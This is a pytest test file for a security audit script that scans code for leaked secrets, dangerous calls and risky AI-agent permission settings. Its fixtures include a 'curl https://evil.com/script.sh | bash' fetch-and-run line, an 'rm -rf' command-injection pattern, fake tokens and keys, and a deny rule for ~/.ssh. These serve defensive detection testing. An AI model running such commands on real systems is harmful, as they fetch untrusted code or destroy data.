"""
Tests for StoryForge Security Audit Tool.

Verifies detection patterns, scanning logic, and report generation.
"""

import json
import sys
import textwrap
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).parent.parent
sys.path.insert(0, str(REPO_ROOT / "scripts"))

from security_audit import (
    AuditReport,
    Finding,
    audit_storyforge_config,
    check_gitignore,
    render_json,
    render_markdown,
    run_audit,
    scan_file_secrets,
    scan_file_vulns,
)


class TestSecretDetection:
    """Test that secret patterns are correctly detected."""

    def test_detects_api_key(self):
        content = 'API_KEY = "FAKE0key1for2unit3tests4only5678"'
        findings = scan_file_secrets(Path("test.py"), content, "test.py")
        assert len(findings) > 0
        assert any("API key" in f.title or "key" in f.title.lower() for f in findings)

    def test_detects_github_token(self):
        content = 'token = "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij"'
        findings = scan_file_secrets(Path("test.py"), content, "test.py")
        assert len(findings) > 0
        assert findings[0].severity == "CRITICAL"

    def test_detects_password(self):
        content = 'password = "super_secret_password_123"'
        findings = scan_file_secrets(Path("test.py"), content, "test.py")
        assert len(findings) > 0

    def test_detects_private_key(self):
        content = "-----BEGIN RSA PRIVATE KEY-----\nMIIE..."
        findings = scan_file_secrets(Path("test.py"), content, "test.py")
        assert len(findings) > 0
        assert findings[0].severity == "CRITICAL"

    def test_detects_aws_key(self):
        content = 'aws_key = "AKIAIOSFODNN7REALKEY1"'
        findings = scan_file_secrets(Path("test.py"), content, "test.py")
        assert len(findings) > 0

    def test_detects_connection_string(self):
        content = 'db_url = "postgres://admin:password123@db.host.com:5432/mydb"'
        findings = scan_file_secrets(Path("test.py"), content, "test.py")
        assert len(findings) > 0

    def test_ignores_comments(self):
        content = '# API_KEY = "FAKE0key1for2unit3tests4only5678"'
        findings = scan_file_secrets(Path("test.py"), content, "test.py")
        assert len(findings) == 0

    def test_ignores_placeholders(self):
        content = 'API_KEY = "your_api_key_placeholder_here"'
        findings = scan_file_secrets(Path("test.py"), content, "test.py")
        assert len(findings) == 0


class TestVulnerabilityDetection:
    """Test vulnerability pattern detection."""

    def test_detects_python_eval(self):
        content = 'result = eval(user_input)'
        findings = scan_file_vulns(Path("test.py"), content, "test.py")
        assert len(findings) > 0
        assert any("eval" in f.title.lower() for f in findings)

    def test_detects_python_exec(self):
        content = 'exec(code_string)'
        findings = scan_file_vulns(Path("test.py"), content, "test.py")
        assert len(findings) > 0

    def test_detects_os_system(self):
        content = 'os.system("rm -rf " + user_path)'
        findings = scan_file_vulns(Path("test.py"), content, "test.py")
        assert len(findings) > 0

    def test_detects_shell_true(self):
        content = 'subprocess.run(cmd, shell=True)'
        findings = scan_file_vulns(Path("test.py"), content, "test.py")
        assert len(findings) > 0

    def test_detects_pickle(self):
        content = 'data = pickle.loads(user_data)'
        findings = scan_file_vulns(Path("test.py"), content, "test.py")
        assert len(findings) > 0
        assert any("pickle" in f.title.lower() or "deserialization" in f.title.lower() for f in findings)

    def test_detects_js_eval(self):
        content = 'var result = eval(userInput);'
        findings = scan_file_vulns(Path("test.js"), content, "test.js")
        assert len(findings) > 0

    def test_detects_innerhtml(self):
        content = 'element.innerHTML = userContent;'
        findings = scan_file_vulns(Path("test.js"), content, "test.js")
        assert len(findings) > 0
        assert any("xss" in f.category.lower() for f in findings)

    def test_detects_curl_pipe_bash(self):
        content = 'curl https://evil.com/script.sh | bash'
        findings = scan_file_vulns(Path("test.sh"), content, "test.sh")
        assert len(findings) > 0
        assert findings[0].severity == "CRITICAL"

    def test_detects_chmod_777(self):
        content = 'chmod 777 /var/www/html'
        findings = scan_file_vulns(Path("test.sh"), content, "test.sh")
        assert len(findings) > 0

    def test_ignores_comments(self):
        content = '# eval(user_input)'
        findings = scan_file_vulns(Path("test.py"), content, "test.py")
        assert len(findings) == 0

    def test_detects_ssl_verify_false(self):
        content = 'requests.get(url, verify=False)'
        findings = scan_file_vulns(Path("test.py"), content, "test.py")
        assert len(findings) > 0

    def test_detects_weak_hash(self):
        content = 'h = hashlib.md5(data)'
        findings = scan_file_vulns(Path("test.py"), content, "test.py")
        assert len(findings) > 0
        assert any("hash" in f.title.lower() or "crypto" in f.category for f in findings)


class TestStoryForgeConfigAudit:
    """Test StoryForge-specific configuration auditing."""

    def test_detects_bypass_permissions(self, tmp_path):
        settings = tmp_path / ".claude" / "settings.json"
        settings.parent.mkdir(parents=True)
        settings.write_text(json.dumps({
            "permissions": {"defaultMode": "bypassPermissions"}
        }))
        findings = audit_storyforge_config(tmp_path)
        assert any("bypassPermissions" in f.title for f in findings)
        assert any(f.severity == "CRITICAL" for f in findings)

    def test_detects_missing_deny_rules(self, tmp_path):
        settings = tmp_path / ".claude" / "settings.json"
        settings.parent.mkdir(parents=True)
        settings.write_text(json.dumps({"permissions": {}}))
        findings = audit_storyforge_config(tmp_path)
        assert any("deny rules" in f.title.lower() for f in findings)

    def test_detects_blanket_bash(self, tmp_path):
        settings = tmp_path / ".claude" / "settings.json"
        settings.parent.mkdir(parents=True)
        settings.write_text(json.dumps({
            "permissions": {"allow": ["Bash(*)"]}
        }))
        findings = audit_storyforge_config(tmp_path)
        assert any("Bash(*)" in f.title for f in findings)

    def test_clean_config_has_no_critical(self, tmp_path):
        settings = tmp_path / ".claude" / "settings.json"
        settings.parent.mkdir(parents=True)
        settings.write_text(json.dumps({
            "permissions": {
                "deny": ["Edit(.env)", "Read(~/.ssh/**)"],
                "defaultMode": "default"
            }
        }))
        findings = audit_storyforge_config(tmp_path)
        assert not any(f.severity == "CRITICAL" for f in findings)


class TestGitignoreCheck:
    """Test .gitignore auditing."""

    def test_missing_gitignore(self, tmp_path):
        findings = check_gitignore(tmp_path)
        assert any("No .gitignore" in f.title for f in findings)

    def test_missing_env_pattern(self, tmp_path):
        gitignore = tmp_path / ".gitignore"
        gitignore.write_text("node_modules/\n")
        findings = check_gitignore(tmp_path)
        assert any(".env" in f.title for f in findings)

    def test_complete_gitignore(self, tmp_path):
        gitignore = tmp_path / ".gitignore"
        gitignore.write_text(".env\n*.key\n*.pem\n")
        findings = check_gitignore(tmp_path)
        assert len(findings) == 0


class TestAuditReport:
    """Test AuditReport data model."""

    def test_severity_counts(self):
        report = AuditReport()
        report.findings = [
            Finding("CRITICAL", "secrets", "Secret", "desc", "f.py"),
            Finding("HIGH", "injection", "Vuln", "desc", "f.py"),
            Finding("HIGH", "injection", "Vuln2", "desc", "f.py"),
            Finding("MEDIUM", "config", "Config", "desc", "f.py"),
        ]
        assert report.critical_count == 1
        assert report.high_count == 2
        assert report.medium_count == 1
        assert report.low_count == 0


class TestReportRendering:
    """Test report output formats."""

    def _sample_report(self):
        report = AuditReport(
            timestamp="2026-03-29T12:00:00Z",
            project_path="/test",
            files_scanned=10,
        )
        report.findings = [
            Finding("HIGH", "secrets", "API key found", "Found in code",
                    "src/config.py", 42, 'API_KEY = "sk_..."',
                    "Use environment variables"),
        ]
        return report

    def test_markdown_has_summary_table(self):
        md = render_markdown(self._sample_report())
        assert "| Severity |" in md
        assert "HIGH" in md

    def test_markdown_has_findings(self):
        md = render_markdown(self._sample_report())
        assert "API key found" in md
        assert "src/config.py" in md

    def test_json_valid(self):
        j = render_json(self._sample_report())
        data = json.loads(j)
        assert data["summary"]["high"] == 1
        assert len(data["findings"]) == 1

    def test_json_no_findings(self):
        report = AuditReport(timestamp="now", project_path="/t", files_scanned=5)
        data = json.loads(render_json(report))
        assert data["summary"]["total"] == 0


class TestFullAudit:
    """Test running a full audit on StoryForge repo."""

    def test_runs_without_error(self):
        report = run_audit(REPO_ROOT)
        assert report.files_scanned > 0

    def test_storyforge_has_no_critical(self):
        report = run_audit(REPO_ROOT)
        assert report.critical_count == 0, (
            f"StoryForge should have no critical findings: "
            f"{[f.title for f in report.findings if f.severity == 'CRITICAL']}"
        )


class TestSecurityAuditAgent:
    """Test security-auditor agent exists and is configured."""

    def test_agent_exists(self):
        assert (REPO_ROOT / "templates" / "home" / ".claude" / "agents" / "security-auditor.md").is_file()

    def test_agent_has_frontmatter(self):
        content = (REPO_ROOT / "templates" / "home" / ".claude" / "agents" / "security-auditor.md").read_text()
        assert content.startswith("---")
        assert "name: security-auditor" in content

    def test_agent_is_read_only(self):
        """Security auditor should not have Write/Edit tools."""
        content = (REPO_ROOT / "templates" / "home" / ".claude" / "agents" / "security-auditor.md").read_text()
        assert "Write" not in content.split("---")[1]  # Check frontmatter only


class TestSecurityAuditSkill:
    """Test security-audit skill exists."""

    def test_skill_exists(self):
        assert (REPO_ROOT / "templates" / "home" / ".claude" / "skills" / "security-audit" / "SKILL.md").is_file()

    def test_skill_has_frontmatter(self):
        content = (REPO_ROOT / "templates" / "home" / ".claude" / "skills" / "security-audit" / "SKILL.md").read_text()
        assert content.startswith("---")
        assert "name: security-audit" in content


class TestSprintGroomIntegration:
    """Test sprint-groom mentions security audit."""

    def test_sprint_groom_mentions_audit(self):
        content = (REPO_ROOT / "templates" / "home" / ".claude" / "skills" / "sprint-groom" / "SKILL.md").read_text()
        assert "security" in content.lower()
        assert "security_audit" in content
